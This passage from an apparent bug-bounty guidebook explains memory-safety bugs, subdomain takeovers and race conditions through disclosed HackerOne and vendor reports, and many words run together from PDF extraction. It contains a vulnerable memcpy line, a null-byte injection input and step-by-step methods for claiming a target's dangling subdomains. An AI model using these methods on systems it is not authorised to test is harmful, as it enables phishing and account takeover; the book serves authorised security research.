allocated\nspace (the white boxes) and writing into unintended memory (the red boxes).\n1https://developer.apple.com/library/mac/documentation/Security/Conceptual/SecureCodingGuide/Articles/BufferOverflows.\nhtml\nMemory 122\nRead out of Bounds\nIn addition to writing data beyond the allocated memory, another vulnerability lies in\nreading data outside a memory boundary. This is a type of Buffer Overflow in that\nmemory is being read beyond what the buffer should allow.\nAfamousandrecentexampleofavulnerabilityreadingdataoutsideofamemorybound-\naryistheOpenSSLHeartbleedBug,disclosedinApril2014.Atthetimeofdisclosure,ap-\nproximately17%(500k)oftheinternet’ssecurewebserverscertifiedbytrustedauthori-\ntieswerebelievedtohavebeenvulnerabletotheattack(https://en.wikipedia.org/wiki/Heartbleed2).\nHeartbleedcould be exploited tosteal server private keys,session data, passwords, etc.\nIt was executed by sending a “Heartbeat Request” message to a server which would\nthen send exactly the same message back to the requester. The message could include\na length parameter. Those vulnerable to the attack allocated memory for the message\nbased on the length parameter without regard to the actual size of the message.\nAs a result, the Heartbeat message was exploited by sending a small message with a\nlarge length parameter which vulnerable recipients used to read extra memory beyond\nwhat was allocated for the message memory. Here is an image from Wikipedia:\n2https://en.wikipedia.org/wiki/Heartbleed\nMemory 123\nHeartbleedexample\nWhileamoredetailedanalysisofBufferOverflows,ReadOutofBoundsandHeartbleed\nare beyond the scope of this book, if you’re interested in learning more, here are some\ngood resources:\nApple Documentation3\n3https://developer.apple.com/library/mac/documentation/Security/Conceptual/SecureCodingGuide/Articles/BufferOverflows.\nhtml\nMemory 124\nWikipedia Buffer Overflow Entry4\nWikipedia NOP Slide5\nOpen Web Application Security Project6\nHeartbleed.com7\nMemory Corruption\nMemory corruption is a technique used to expose a vulnerability by causing code to\nperformsometypeofunusualorunexpectedbehaviour.Theeffectissimilartoabuffer\noverflow where memory is exposed when it shouldn’t be.\nAn example of this is Null Byte Injection. This occurs when a null byte, or empty string\n%00 or 0x00 in hexidecimal, is provided and leads to unintended behaviour by the\nreceivingprogram.InC/C++,orlowlevelprogramminglanguages,anullbyterepresents\nthe end of a string, or string termination. This can tell the program to stop processing\nthe string immediately and bytes that come after the null byte are ignored.\nThisisimpactfulwhenthecodeisrelyingonthelengthofthestring.Ifanullbyteisread\nandtheprocessingstops,astringthatshouldbe10charactersmaybeturnedinto5.For\nexample:\nthisis%00mystring\nThis string should have a length of 15 but if the string terminates with the null byte, its\nvalue would be 6. This is problematic with lower level languages that manage their own\nmemory.\nNow, with regards to web applications, this becomes relevant when web applications\ninteract with libraries, external APIs, etc. written in C. Passing in %00 in a Url could lead\ntoattackersmanipulatingwebresources,includingreadingorwritingfilesbasedonthe\npermissions of the web application in the broader server environment. Especially when\ntheprogramminglanguageinquestion,likePHP,iswritteninaCprogramminglanguage\nitself.\n4https://en.wikipedia.org/wiki/Buffer_overflow\n5https://en.wikipedia.org/wiki/NOP_slide\n6https://www.owasp.org/index.php/Buffer_Overflow\n7http://heartbleed.com\nMemory 125\nOWASP Links\nCheck out more information at OWASP Buffer Overflows8 Check out OWASP\nReviewing Code for Buffer Overruns and Overflows9 Check out OWASP Testing\nfor Buffer Overflows10 Check out OWASP Testing for Heap Overflows11 Check\noutOWASPTestingforStackOverflows12CheckoutmoreinformationatOWASP\nEmbeddingNullCode13\nExamples\n1. PHP ftp_genlist()\nDifficulty: High\nUrl: N/A\nReport Link: https://bugs.php.net/bug.php?id=6954514\nDate Reported: May 12, 2015\nBounty Paid: $500\nDescription:\nThePHPprogramminglanguageiswrittenintheCprogramminglanguagewhichhasthe\npleasure of managing its own memory. As described above, Buffer Overflows allow for\nmalicious users to write to what should be inaccessible memory and potential remotely\nexecute code.\nIn this situation, the ftp_genlist() function of the ftp extension allowed for an overflow,\nor sending more than 4,294MB which would have been written to a temporary file.\n∼\nThisinturnresultedintheallocatedbufferbeingtosmalltoholdthedatawrittentothe\ntemp file, which resulted in a heap overflow when loading the contents of the temp file\nback into memory.\n8https://www.owasp.org/index.php/Buffer_Overflows\n9https://www.owasp.org/index.php/Reviewing_Code_for_Buffer_Overruns_and_Overflows\n10https://www.owasp.org/index.php/Testing_for_Buffer_Overflow_(OTG-INPVAL-014)\n11https://www.owasp.org/index.php/Testing_for_Heap_Overflow\n12https://www.owasp.org/index.php/Testing_for_Stack_Overflow\n13https://www.owasp.org/index.php/Embedding_Null_Code\n14https://bugs.php.net/bug.php?id=69545\nMemory 126\nTakeaways\nBuffer Overflows are an old, well known vulnerability but still common when\ndealing with applications that manage their own memory, particularly C and\nC++. If you find out that you are dealing with a web application based on the C\nlanguage(ofwhichPHPiswrittenin),bufferoverflowsareadistinctpossibility.\nHowever, if you’re just starting out, it’s probably more worth your time to find\nsimplerinjectionrelatedvulnerabilitiesandcomebacktoBufferOverflowswhen\nyouaremoreexperienced.\n2. Python Hotshot Module\nDifficulty: High\nUrl: N/A\nReport Link: http://bugs.python.org/issue2448115\nDate Reported: June 20, 2015\nBounty Paid: $500\nDescription:\nLike PHP, the Python programming language is written in the C programming language,\nwhichasmentionedpreviously,managesit’sownmemory.ThePythonHotshotModule\nis a replacement for the existing profile module and is written mostly in C to achieve a\nsmaller performance impact than the existing profile module. However, in June 2015, a\nBufferOverflowvulnerabilitywasdiscoveredrelatedtocodeattemptingtocopyastring\nfrom one memory location to another.\nEssentially, the vulnerable code called the method memcpy which copies memory from\none location to another taking in the number of bytes to be copied. Here’s the line:\nmemcpy(self->buffer + self->index, s, len);\nThe memcpy method takes 3 parameters, str, str2 and n. str1 is the destination, str is\nthe source to be copied and n is the number of bytes to be copied. In this case, those\ncorresponded to self->buffer + self->index, s and len.\nIn this case, the vulnerability lied in the fact that the self->buffer was always a fixed\nlength where as s could be of any length.\nAs a result, when executing the copy function (as in the diagram from Apple above), the\nmemcpy function would disregard the actual size of the area copied to thereby creating\nthe overflow.\n15http://bugs.python.org/issue24481\nMemory 127\nTakeaways\nWe’ve now see examples of two functions which implemented incorrectly are\nhighly susceptible to Buffer Overflows, memcpy and strcpy. If we know a site\nor application is reliant on C or C++, it’s possible to search through source\ncode libraries for that language (use something like grep) to find incorrect\nimplementations.\nThe key will be to find implementations that pass a fixed length variable as the\nthird parameter to either function, corresponding to the size of the data to be\nallocatedwhenthedatabeingcopiedisinfactofavariablelength.\nHowever,asmentionedabove,ifyouarejuststartingout,itmaybemoreworth\nyour time to forgo searching for these types of vulnerabilities, coming back to\nthemwhenyouaremorecomfortablewithwhitehathacking.\n3. Libcurl Read Out of Bounds\nDifficulty: High\nUrl: N/A\nReport Link: http://curl.haxx.se/docs/adv_20141105.html16\nDate Reported: November 5, 2014\nBounty Paid: $1,000\nDescription:\nLibcurl is a free client-side URL transfer library and used by the cURL command line\ntool for transferring data. A vulnerability was found in the libcurl curl_easy_duphandle()\nfunction which could have been exploited for sending sensitive data that was not\nintended for transmission.\nWhenperformingatransferwithlibcurl,itispossibletouseanoption,CURLOPT_COPY-\nPOSTFIELDS to specify a memory location for the data to be sent to the remote server.\nIn other words, think of a holding tank for your data. The size of the location (or tank) is\nset with a separate option.\nNow, without getting overly technical, the memory area was associated with a “handle”\n(knowing exactly what a handle is is beyond the scope of this book and not necessary\ntofollowalonghere)andapplicationscouldduplicatethehandletocreateacopyofthe\ndata.Thisiswherethevulnerabilitywas-theimplementationofthecopywasperformed\nwith the strdup function and the data was assumed to have a zero (null) byte which\ndenotes the end of a string.\n16http://curl.haxx.se/docs/adv_20141105.html\nMemory 128\nIn this situation, the data may not have a zero (null) byte or have one at an arbitrary\nlocation. As a result, the duplicated handle could be too small, too large or crash the\nprogram. Additionally, after the duplication, the function to send data did not account\nfor the data already having been read and duplicated so it also accessed and sent data\nbeyond the memory address it was intended to.\nTakeaways\nThis is an example of a very complex vulnerability. While it bordered on being\ntoo technical for the purpose of this book, I included it to demonstrate the\nsimilarities with what we have already learned. When we break this down, this\nvulnerabilitywasalsorelatedtoamistakeinCcodeimplementationassociated\nwithmemorymanagement,specificallycopyingmemory.Again,ifyouaregoing\ntostartdigginginClevelprogramming,startlookingfortheareaswheredatais\nbeingcopiedfromonememorylocationtoanother.\n4. PHP Memory Corruption\nDifficulty: High\nUrl: N/A\nReport Link: https://bugs.php.net/bug.php?id=6945317\nDate Reported: April 14, 2015\nBounty Paid: $500\nDescription:\nThephar_parse_tarfile method did not account for file names that start with a null byte,\na byte that starts with a value of zero, i.e. 0x00 in hex.\nDuring the execution of the method, when the filename is used, an underflow in the\narray (i.e., trying to access data that doesn’t actually exist and is outside of the array’s\nallocated memory) will occur.\nThis is a significant vulnerability because it provides a hacker access to memory which\nshould be off limits.\n17https://bugs.php.net/bug.php?id=69453\nMemory 129\nTakeaways\nJust like Buffer Overflows, Memory Corruption is an old but still common\nvulnerability when dealing with applications that manage their own memory,\nparticularlyCandC++.Ifyoufindoutthatyouaredealingwithawebapplication\nbasedontheClanguage(ofwhichPHPiswrittenin),beonthelookupforways\nthatmemorycanbemanipulated.However,again,ifyou’rejuststartingout,it’s\nprobably more worth your time to find simpler injection related vulnerabilities\nandcomebacktoMemoryCorruptionwhenyouaremoreexperience.\nSummary\nWhile memory related vulnerabilities make for great headlines, they are very tough to\nwork on and require a considerable amount of skill. These types of vulnerabilities are\nbetter left alone unless you have a programming background in low level programming\nlanguages.\nWhile modern programming languages are less susceptible to them due to their own\nhandling of memory and garbage collection, applications written in the C programming\nlanguages are still very susceptible. Additionally, when you are working with modern\nlanguageswritteninCprogramminglanguagesthemselves,thingscangetabittricky,as\nwe have seen with the PHP ftp_genlist() and Python Hotshot Module examples.\n16. Sub Domain Takeover\nDescription\nAsubdomaintakeoverisreallywhatitsoundslike,asituationwhereamaliciousperson\nis able to claim a sub domain on behalf of a legitimate site. In a nutshell, this type of\nvulnerability involves a site creating a DNS entry for a sub domain, for example, Heroku\n(the hosting company) and never claiming that sub domain.\n1. example.com registers on Heroku\n2. example.com creates a DNS entry pointing sub domain.example.com to uni-\ncorn457.heroku.com\n3. example.com never claims unicorn457.heroku.com\n4. A malicious person claims unicorn457.heroku.com and replicates example.com\n5. All traffic for sub domain.example.com is directed to a malicious website which\nlooks like example.com\nSo,inorderforthistohappen,thereneedstobeunclaimedDNSentriesforanexternal\nservice like Heroku, Github, Amazon S3, Shopify, etc. A great way to find these is using\nKnockPy, which is discussed in the Tools section and iterates over a common list of sub\ndomains to verify their existence.\nExamples\n1. Ubiquiti Sub Domain Takeover\nDifficulty: Low\nUrl: http://assets.goubiquiti.com\nReport Link: https://hackerone.com/reports/1096991\nDate Reported: January 10, 2016\nBounty Paid: $500\nDescription:\n1https://hackerone.com/reports/109699\nSubDomainTakeover 131\nJust as the description for sub domain takeovers implies, http://assets.goubiquiti.com\nhadaDNSentrypointingtoAmazonS3forfilestoragebutnoAmazonS3bucketactually\nexisting. Here’s the screenshot from HackerOne:\nGoubiquitiAssetsDNS\nAsaresult,amaliciouspersoncouldclaimuwn-images.s3-website-us-west-1.amazonaws.com\nandhostasitethere.AssumingtheycanmakeitlooklikeUbiquiti,thevulnerabilityhere\nis tricking users into submitting personal information and taking over accounts.\nTakeaways\nDNSentriespresentanewanduniqueopportunitytoexposevulnerabilities.Use\nKnockPyinanattempttoverifytheexistenceofsubdomainsandthenconfirm\nthey are pointing to valid resources paying particular attention to third party\nservice providers like AWS, Github, Zendesk, etc. - services which allow you to\nregistercustomizedURLs.\n2. Scan.me Pointing to Zendesk\nDifficulty: Low\nUrl: support.scan.me\nReport Link: https://hackerone.com/reports/1141342\nDate Reported: February 2, 2016\nBounty Paid: $1,000\nDescription:\nJustliketheUbiquitiexample,here,scan.me-aSnapchatacquisition-hadaCNAMEentry\npointing support.scan.me to scan.zendesk.com. In this situation, the hacker harry_mg\nwas able to claim scan.zendesk.com which support.scan.me would have directed to.\nAnd that’s it. $1,000 payout￿\nTakeaways\nPAYATTENTION!ThisvulnerabilitywasfoundFebruary2016andwasn’tcomplex\natall.Successfulbughuntingrequireskeenobservation.\n2https://hackerone.com/reports/114134\nSubDomainTakeover 132\n3. Shopify Windsor Sub Domain Takeover\nDifficulty: Low\nUrl: windsor.shopify.com\nReport Link: https://hackerone.com/reports/1503743\nDate Reported: July 10, 2016\nBounty Paid: $500\nDescription:\nIn July 2016, Shopify disclosed a bug in their DNS configuration that had left the\nsubdomainwindsor.shopify.comredirectedtoanotherdomain,aislingofwindsor.com\nwhichtheynolongerowned.Readingthereportandchattingwiththereporter,@zseano,\nthere are a few things that make this interesting and notable.\nFirst, @zseano, or Sean, stumbled across the vulnerability while he was scanning for\nanother client he was working with. What caught his eye was the fact that the sub\ndomainswere*.shopify.com.Ifyou’refamiliarwiththeplatform,registeredstoresfollow\nthesubdomainpattern,*.myshopify.com.Thisshouldbearedflagforadditionalareas\ntotestforvulnerabilities.KudostoSeanforthekeenobservation.However,onthatnote,\nShopify’sprogramscopeexplicitlylimitstheirprogramtoShopifyshops,theiradminand\nAPI,softwareusedwithintheShopifyapplicationandspecificsubdomains.Itstatesthat\nif the domain isn’t explicitly listed, it isn’t in scope so arguably, here, they did not need\nto reward Sean.\nSecondly, the tool Sean used, crt.sh is awesome. It will take a Domain Name, Organi-\nzation Name, SSL Certificate Finger Print (more if you used the advanced search) and\nreturnsubdomainsassociatedwithsearchquery’scertificates.Itdoesthisbymonitoring\nCertificate Transparency logs. While this topic is beyond the scope of this book, in a\nnutshell, these logs verify that certificates are valid. In doing so, they also disclose a\nhuge number of otherwise potentially hidden internal servers and systems, all of which\nshould be explored if the program you’re hacking on includes all sub domains (some\ndon’t!).\nThird,afterfindingthelist,Seanstartedtotestthesitesonebyone.Thisisastepthatcan\nbeautomatedbutremember,hewasworkingonanotherprogramandgotsidetracked.\nSo, after testing windsor.shopify.com, he discovered that it was returning an expired\ndomainerrorpage.Naturally,hepurchasedthedomain,aislingofwindsor.comsonow\nShopify was pointing to his site. This could have allowed him to abuse the trust a victim\nwould have with Shopify as it would appear to be a Shopify domain.\nHe finished off the hack by reporting the vulnerability to Shopify.\n3https://hackerone.com/reports/150374\nSubDomainTakeover 133\nTakeaways\nAs described, there are multiple takeaways here. First, start using crt.sh to\ndiscover sub domains. It looks to be a gold mine of additional targets within a\nprogram.Secondly,subdomaintakeoversaren’tjustlimitedtoexternalservices\nlike S3, Heroku, etc. Here, Sean took the extra step of actually registered the\nexpired domain Shopify was pointing to. If he was malicious, he could have\ncopied the Shopify sign in page on the domain and began harvesting user\ncredentials.\n4. Snapchat Fastly Takeover\nDifficulty: Medium\nUrl: http://fastly.sc-cdn.net/takeover.html\nReport Link: https://hackerone.com/reports/1544254\nDate Reported: July 27, 2016\nBounty Paid: $3,000\nDescription:\nFastlyisacontentdeliverynetwork,orCDN,usedtoquicklydelivercontenttousers.The\nidea of a CDN is to store copies of content on servers across the world so that there is a\nshorter time and distance for delivering that content to the users requesting it. Another\nexample would be Amazon’s CloudFront.\nOn July 27, 2016, Ebrietas reported to Snapchat that they had a DNS misconfiguration\nwhich resulted in the url http://fastly.sc-cdn.net having a CNAME record pointed to a Fastly\nsub domain which it did not own. What makes this interesting is that Fastly allows you\ntoregistercustomsubdomainswiththeirserviceifyouaregoingtoencryptyourtraffic\nwithTLSandusetheirsharedwildcardcertificatetodoso.Accordingtohim,visitingthe\nURL resulted in message similar to “Fastly error: unknown domain: XXXXX. Please\ncheck that this domain has been added to a service.”.\nWhile Ebrietas didn’t include the Fastly URL used in the take over, looking at the Fastly\ndocumentation(https://docs.fastly.com/guides/securing-communications/setting-up-free-\ntls), it looks like it would have followed the pattern EXAMPLE.global.ssl.fastly.net. Based\non his reference to the sub domain being “a test instance of fastly”, it’s even more likely\nthat Snapchat set this up using the Fastly wildcard certificate to test something.\nInaddition,therearetwoadditionalpointswhichmakethisreportnoteworthyandworth\nexplaining:\n4https://hackerone.com/reports/154425\nSubDomainTakeover 134\n1. fastly.sc-cdn.net was Snapchat’s sub domain which pointed to the Fastly CDN. That\ndomain, sc-cdn.net, is not very explicit and really could be owned by anyone if\nyou had to guess just by looking at it. To confirm its ownership, Ebrietas looked\nup the SSL certificate with censys.io. This is what distinguishes good hackers from\ngreat hackers, performing that extra step to confirm your vulnerabilities rather\nthan taking a chance.\n2. The implications of the take over were not immediately apparent. In his initial\nreport, Ebrietas states that it doesn’t look like the domain is used anywhere on\nSnapchat.However,helefthisserverupandrunning,checkingthelogsaftersome\ntime only to find Snapchat calls, confirming the sub domain was actually in use.\nroot@localhost:~#cat/var/log/apache2/access.log| grep-vserver-status|gre\\\npsnapchat-i\n23.235.39.33--[02/Aug/2016:18:28:25+0000]\"GET/bq/story_blob?story_id=fRaYu\\\ntXlQBosonUmKavo1uA&t=2&mt=0HTTP/1.1...\n23.235.39.43--[02/Aug/2016:18:28:25+0000]\"GET/bq/story_blob?story_id=f3gHI\\\n7yhW-Q7TeACCzc2nKQ&t=2&mt=0HTTP/1.1...\n23.235.46.45--[03/Aug/2016:02:40:48+0000]\"GET/bq/story_blob?story_id=fKGG6\\\nu9zG4juOFT7-k0PNWw&t=2&mt=1&encoding...\n23.235.46.23--[03/Aug/2016:02:40:49+0000]\"GET/bq/story_blob?story_id=fco3g\\\nXZkbBCyGc_Ym8UhK2g&t=2&mt=1&encoding...\n43.249.75.20--[03/Aug/2016:12:39:03+0000]\"GET/discover/dsnaps?edition_id=4\\\n527366714425344&dsnap_id=56515658813...\n43.249.75.24--[03/Aug/2016:12:39:03+0000]\"GET/bq/story_blob?story_id=ftzqL\\\nQky4KJ_B6Jebus2Paw&t=2&mt=1&encoding...\n43.249.75.22--[03/Aug/2016:12:39:03+0000]\"GET/bq/story_blob?story_id=fEXbJ\\\n2SDn3Os8m4aeXs-7Cg&t=2&mt=0HTTP/1.1...\n23.235.46.21--[03/Aug/2016:14:46:18+0000]\"GET/bq/story_blob?story_id=fu8jK\\\nJ_5yF71_WEDi8eiMuQ&t=1&mt=1&encoding...\n23.235.46.28--[03/Aug/2016:14:46:19+0000]\"GET/bq/story_blob?story_id=flWVB\\\nXvBXToy-vhsBdze11g&t=1&mt=1&encoding...\n23.235.44.35--[04/Aug/2016:05:57:37+0000]\"GET/bq/story_blob?story_id=fuZO-\\\n2ouGdvbCSggKAWGTaw&t=0&mt=1&encoding...\n23.235.44.46--[04/Aug/2016:05:57:37+0000]\"GET/bq/story_blob?story_id=fa3DT\\\nt_mL0MhekUS9ZXg49A&t=0&mt=1&encoding...\n185.31.18.21--[04/Aug/2016:19:50:01+0000]\"GET/bq/story_blob?story_id=fDL27\\\n0uTcFhyzlRENPVPXnQ&t=0&mt=1&encoding...\nIn resolving the report, Snapchat confirmed that while requests didn’t include access\ntokens or cookies, users could have been served malicious content. As it turns out,\naccording to Andrew Hill from Snapchat:\nSubDomainTakeover 135\nA very small subset of users using an old client that had not checked-in\nfollowing the CDN trial period would have reached out for static, unauthen-\nticated content (no sensitive media). Shortly after, the clients would have\nrefreshed their configuration and reached out to the correct endpoint. In\ntheory,alternatemediacouldhavebeenservedtothisverysmallsetofusers\non this client version for a brief period of time.\nTakeaways\nAgain, we have a few take aways here. First, when searching for sub domain\ntakeovers,beonthelookoutfor*.global.ssl.fastly.netURLsasitturnsoutthat\nFastly is another web service which allows users to register names in a global\nnamespace.Whendomainsarevulnerable,Fastlydisplaysamessagealongthe\nlinesof“Fastlydomaindoesnotexist”.\nSecond, always go the extra step to confirm your vulnerabilities. In this case,\nEbrietas looked up the SSL certificate information to confirm it was owned by\nSnapchat before reporting. Lastly, the implications of a take over aren’t always\nimmediately apparent. In this case, Ebrietas didn’t think this service was used\nuntil he saw the traffic coming in. If you find a takeover vulnerability, leave\nthe service up for some time to see if any requests come through. This might\nhelp you determine the severity of the issue to explain the vulnerability to the\nprogram you’re reporting to which is one of the components of an effective\nreportasdiscussedintheVulnerabilityReportschapter.\n5. api.legalrobot.com\nDifficulty: Medium\nUrl: api.legalrobot.com\nReport Link: https://hackerone.com/reports/1487705\nDate Reported: July 1, 2016\nBounty Paid: $100\nDescription:\nOn July 1, 2016, the Frans Rosen6 submitted a report to Legal Robot notifying them that\nhe had a DNS CNAME entry for api.legalrobot.com pointing to Modulus.io but that they\nhadn’t claimed the name space there.\n5https://hackerone.com/reports/148770\n6https://www.twitter.com/fransrosen\nSubDomainTakeover 136\nModulusApplicationNotFound\nNow,youcanprobablyguessthatFransthenvisitedModulusandtriedtoclaimthesub\ndomain since this is a take over example and the Modulus documentation states, “Any\ncustom domains can be specified” by their service. But this example is more than that.\nThereasonthisexampleisnoteworthyandincludedhereisbecauseFranstriedthatand\nthe sub domain was already claimed. But when he couldn’t claim api.legalrobot.com,\nratherthanwalkingaway,hetriedtoclaimthewildcardsubdomain,*.legalrobot.com\nwhich actually worked.\nSubDomainTakeover 137\nModulusWildCardSiteClaimed\nAfterdoingso,hewenttheextra(albeitsmall)stepfurthertohosthisowncontentthere:\nFransRosenHelloWorld\nSubDomainTakeover 138\nTakeaways\nIincludedthisexamplefortworeasons;first,whenFranstriedtoclaimthesub\ndomain on Modulus, the exact match was taken. However, rather than give up,\nhe tried claiming the wild card domain. While I can’t speak for other hackers, I\ndon’t know if I would have tried that if I was in his shoes. So, going forward, if\nyou find yourself in the same position, check to see if the third party services\nallowsforwildcardclaiming.\nSecondly, Frans actually claimed the sub domain. While this may be obvious to\nsome, I want to reiterate the importance of proving the vulnerability you are\nreporting. In this case, Frans took the extra step to ensure he could claim the\nsub domain and host his own content. This is what differentiates great hackers\nfrom good hackers, putting in that extra effort to ensure you aren’t reporting\nfalsepositives.\n6. Uber SendGrid Mail Takeover\nDifficulty: Medium\nUrl: @em.uber.com\nReport Link: https://hackerone.com/reports/1565367\nDate Reported: August 4, 2016\nBounty Paid: $10,000\nDescription:\nSendGrid is a cloud-based email service developed to help companies deliver email.\nTurns out, Uber uses them for their email delivery. As a result, the hackers on the\nUranium238 team took a look at Uber’s DNS records and noted the company had a\nCNAMEforem.uber.compointingtoSendGrid(rememberaCNAMEisacanonicalname\nrecord which defines an alias for a domain).\nSince there was a CNAME, the hackers decided to poke around SendGrid to see how\ndomains were claimed and owned by the service. According to their write up, they\nfirst looked at whether SendGrid allowed for content hosting, to potentially exploit the\nconfigurationbyhostingtheirowncontent.However,SendGridisexplicit,theydon’thost\ndomains.\nContinuing on, Uranium238 came across a different option, white-labeling, which\naccording to SendGrid:\n￿is the functionality that shows ISPs that SendGrid has your permission to\nsendemailsonyourbehalf.Thispermissionisgivenbytheactofpointingvery\n7https://hackerone.com/reports/156536\nSubDomainTakeover 139\nspecificDNSentriesfromyourdomainregistrartoSendGrid.OncetheseDNS\nentriesareenteredandpropagated,recipientemailserversandserviceswill\nreadtheheadersontheemailsyousendandchecktheDNSrecordstoverify\nthe email was initiated at a trusted source. This drastically increases your\nability to deliver email and allows you to begin building a sender reputation\nfor your domain and your IP addresses.\nThislookspromising.BycreatingtheproperDNSentries,SendGridcouldsendemailson\na customer’s behalf. Sure enough, looking at em.uber.com’s MX records revealed it was\npointingtomx.sendgrid.net(amailexchanger,MX,recordisatypeofDNSrecordwhich\nspecifies a mail server responsible for accepting email on behalf of a recipient domain).\nNow,confirmingUber’ssetupwithSendGrid,Uranium238dugintotheSendGrid’swork\nflowanddocumentation.Turnsout,SendGridofferedanInboundParseWebhook,which\nallowsthecompanytoparseattachmentsandcontentsofincomingemails.Todoso,all\ncustomers have to do is:\n1. Point the MX Record of a Domain/Hostname or Subdomain to mx.sendgrid.net\n2. Associate the Domain/Hostname and the URL in the Parse API settings page\nBingo. Number 1 was already confirmed and as it turns out, Number 2 wasn’t done,\nem.uber.com wasn’t claimed by Uber. With this now claimed by Uranium238, the last\nwastoconfirmthereceiptoftheemails(remember,thegreathackersgothatextrastep\nfurthertovalidateallfindingswithaproofofconcept,insteadofjuststoppingatclaiming\nthe parse hook in this example).\nTo do so, SendGrid provides some handy information on setting up a listening server.\nYou can check it out here8. With a server configured, the next step is to implement the\ncode to accept the incoming email. Again, they provide this in the post. With that done,\nlastly, Uranium238 used ngrok.io which tunneled the HTTP traffic to their local server\nand confirmed the take over.\n8https://sendgrid.com/blog/collect-inbound-email-using-python-and-flask\nSubDomainTakeover 140\nSendGridInboundParseConfigurationusingngrok.io\nConfirmationofsubdomaintakeoverviaparsedemail\nBut before reporting, Uranium238 also confirmed that multiple sub domains were\nvulnerable, including business, developer, em, email, m, mail, p, p2, security and v.\nAll this said, SendGrid has confirmed they’ve added an additional security check which\nrequires accounts to have a verified domain before adding an inbound parse hook.\nThis should fix the issue and make it no longer exploitable for other companies using\nSendGrid.\nSubDomainTakeover 141\nTakeaways\nThisvulnerabilityisanotherexampleofhowinvaluableitcanbetodigintothird\npartyservices,libraries,etc.thatsitesareusing.Byreadingthedocumentation,\nlearning about SendGrid and understanding the services they provide, Ura-\nnium238 found this issue. Additionally, this example demonstrates that when\nlooking for takeover opportunities, be on the lookout for functionality which\nallowsyoutoclaimsubdomains.\nSummary\nSub Domain Takeovers really aren’t that difficult to accomplish when a site has already\ncreated an unused DNS entry pointing to a third party service provider or unregistered\ndomain.We’veseenthishappenwithHeroku,Fastly,unregistereddomains,S3,Zendesk\nand there are definitely more. There are a variety of ways to discover these vulnerabili-\nties,includingusingKnockPy,GoogleDorks(site:*.hackerone.com),Recon-ng,crt.sh,etc.\nThe use of all of these are included in the Tools chapter of this book.\nAs we learned from Frans, when you’re looking for sub domain takeovers, make sure to\nactually provide proof of the vulnerability and remember to consider claiming the wild\ncard domain if the services allows for it.\nLastly, reading the documentation may be boring but it can be very lucrative. Ura-\nnium238 found their Uber mail takeover by digging into the functionality provided by\nSendGrid.Thisisabigtakeawayasthirdpartyservicesandsoftwarearegreatplacesto\nlook for vulnerabilities.\n17. Race Conditions\nDescription\nA race condition vulnerability occurs when two processes are competing to complete\nagainst each other based on an initial condition which becomes invalid during the\nexecution of the process. A classic example of this is transferring money between bank\naccounts:\n1. Youhaveabankaccountwith$500initandyouneedtotransferthatentireamount\nto a friend.\n2. Usingyourphone,youlogintoyourbankingappandrequesttotransferyour$500\nto your friend.\n3. Therequestistakingtoolongtocomplete,butisstillprocessing,soyoulogintothe\nbankingsiteonyourlaptop,seeyourbalanceisstill$500andrequestthetransfer\nagain.\n4. Within a few seconds, the laptop and mobile requests both finish.\n5. Your bank account is now $0 and you log off of your account.\n6. Your friend messages you to say he received $1,000.\n7. You log back into your account and confirm your balance is $0.\nThisisanunrealisticexampleofaraceconditionbecause(hopefully)allbanksrecognize\nthis possibility and prevent it, but the process is representative of the general concept.\nThe transfers in step 2 and 3 are initiated when your bank account balance is $500.\nThis is the required condition to initiate the transfer, validated only when the process\nbegins. Since you should only be able to transfer an amount equal to or less than\nyour bank balance, initiating two requests for $500 means they are competing for the\nsame available amount. At some point during a bank transfer, the condition should\nbecome invalid, since your balance becomes $0, and any other transfer request should\nfail (assuming you cannot incur a negative balance in your account).\nWithfastinternetconnections,HTTPrequestscanseeminstantaneousbutthere’sstilla\nlotofprocessingtobedone.Forexample,sinceHTTPrequestsarestateless,everyHTTP\nrequest you send requires the receiving site to reauthenticate you and load whatever\ndata’s necessary for your requested action. This is typically achieved by using a cookie\nto perform a database lookup on the application’s server for your account. After this is\ncomplete, the site then processes the request you’ve made.\nReferringbacktothetransferexampleabove,theserverapplicationlogicmightlooklike:\nRaceConditions 143\n1. Receive the HTTP request to transfer money\n2. Query the database for the account information from the cookie included in the\nrequest\n3. Confirm the person making the request has access to the account\n4. Confirm the requested transfer amount is less than the balance\n5. Confirm the person has permission to request transfers\n6. Query the database for the person who is receiving the balance\n7. Confirm that person is able to receive the amount\n8. Remove the transfer amount from the initiator’s account\n9. Add the transfer amount to the recipient’s account\n10. Return a successful message to the initiator\n11. Notify the recipient of the transfer\nAgain,thisisanoversimplificationoftheprocessinglogicanddoesn’tincludeallpossible\nsteps but does demonstrate the steps and logic required to process a money transfer.\nI’ve seen race conditions addressed in a number of different ways. The first is to only\nuse INSERT queries since these are all but instantaneous database actions. Using only\nINSERTS means there is no time lag looking up records to change such as occurs with\nUPDATE queries. However, using this approach isn’t always easy since your application\nwould have to be designed to rely on the most recent records in a table, which may\nor may not be possible. If a site is already heavily used, rewriting an application and\ndatabase design to use this approach may be more trouble than it’s worth.\nSecondly, in situations where only one record should exist in a table for a given action,\nlike payments for an order (you wouldn’t want to pay twice), race conditions can be\naddressed with a unique index in the database. Indexes are a programming concept\nusedtohelpidentifyrecordsinastructureddataset;wesawthempreviouslyinprevious\nchapters when discussing arrays. In databases, indexes are used to help speed up\nqueries (the details of how this is done aren’t important for our purposes) but if you\ncreateauniqueindexontwofields,thedatabasewillprotectagainstthesamecombined\nvalues being inserted twice. So, if you had an e-commerce site with an order payments\ntableincludingtwocolumns,order_idandtransaction_id,addingauniqueindexonthese\ntwo columns would ensure that no race condition could record two payments for the\nsameorder/transactioncombination.However,thissolutionisalsolimitedsinceitonly\napplies to scenarios where there is one record per action in a database table.\nLastly, race conditions can be addressed with locks. This is a programmatic concept\nwhich restricts (or locks) access to specific resources so that other processes can not\naccess them. This addresses race conditions by restricting access the initial conditions\nrequired to introduce the vulnerability. For example, while transferring our money, if\nthe database locked access to the account balance when initiating a transfer, any other\nrequestwouldhavetowaituntilthebalancewasreleased(andpresumablyupdated)to\nRaceConditions 144\nperformanothertransfer.Thiswouldaddressthepossibilityoftworequeststransferring\nan amount which doesn’t exist. However, locking is a complex concept, well beyond the\nscopeofthisbook,andeasytoimplementincorrectlycreatingotherfunctionalbugsfor\nsiteusers.Thefollowingthreeexamplesshowrealexampleswhereraceconditionswere\nexploited against bug bounty programs.\nExamples\n1. Starbucks Race Conditions\nDifficulty: Medium\nUrl: Starbucks.com\nReport Link: http://sakurity.com/blog/2015/05/21/starbucks.html1\nDate Reported: May 21, 2015\nBounty Paid: $0\nDescription:\nAccordingtohisblogpost,EgorHomakovboughtthreeStarbucksgiftcards,eachworth\n$5. 